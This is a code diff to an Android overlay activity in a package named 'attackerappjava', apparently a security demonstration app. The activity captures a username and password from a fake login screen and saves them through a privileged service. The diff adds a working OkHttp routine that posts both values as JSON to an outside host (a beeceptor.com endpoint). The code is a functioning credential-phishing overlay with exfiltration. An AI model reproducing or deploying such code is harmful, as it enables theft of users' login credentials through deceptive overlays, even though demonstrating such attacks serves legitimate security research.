@@ -1,5 +1,6 @@
 package com.example.attackerappjava;
 
+import android.app.DownloadManager;
 import android.content.Intent;
 import android.os.Bundle;
 import android.util.Log;
@@ -9,6 +10,14 @@ import androidx.annotation.Nullable;
 import androidx.appcompat.app.AppCompatActivity;
 
 import com.google.android.material.textfield.TextInputLayout;
+
+import java.io.IOException;
+
+import okhttp3.MediaType;
+import okhttp3.Request;
+import okhttp3.OkHttpClient;
+import okhttp3.RequestBody;
+import okhttp3.Response;
 
 public class OverlayActivity extends AppCompatActivity {
     private static final String TAG = "[OverlayActivity]";
@@ -22,6 +31,9 @@ public class OverlayActivity extends AppCompatActivity {
     Button loginButton;
 
     IUserService privilegedService;
+    private static final OkHttpClient client = new OkHttpClient();
+    public static final MediaType JSON = MediaType.get("application/json; charset=utf-8");
+
 
     @Override
     protected void onCreate(@Nullable Bundle savedInstanceState) {
@@ -50,14 +62,38 @@ public class OverlayActivity extends AppCompatActivity {
             writeToExternalStorage(username);
             writeToExternalStorage(password);
             finish();
+            sendDataOnline(username,password,"https://talsec.free.beeceptor.com");
         }
     }
 
     private void writeToExternalStorage(String content) {
+        Log.d(TAG,"Writing to external storage...");
         try {
             privilegedService.writeToFile(FILE_NAME, content);
         } catch (Exception ignored) {
         }
+    }
+
+    private void sendDataOnline(String username,String password,String targetUrl){
+        String jsonPayload = String.format("{\"username\": \"%s\", \"password\": \"%s\"}", username, password);
+
+        RequestBody body = RequestBody.create(jsonPayload, JSON);
+        Request request = new Request.Builder()
+                .url(targetUrl)
+                .post(body)
+                .build();
+
+        try (Response response = client.newCall(request).execute()) {
+            if (!response.isSuccessful()) {
+                throw new IOException("Unexpected code " + response);
+            }
+            System.out.println("Response Code: " + response.code());
+            System.out.println("Response Body: " + response.body().string());
+        } catch (IOException e) {
+            System.err.println("Error sending JSON: " + e.getMessage());
+            e.printStackTrace();
+        }
+
     }
 }
 
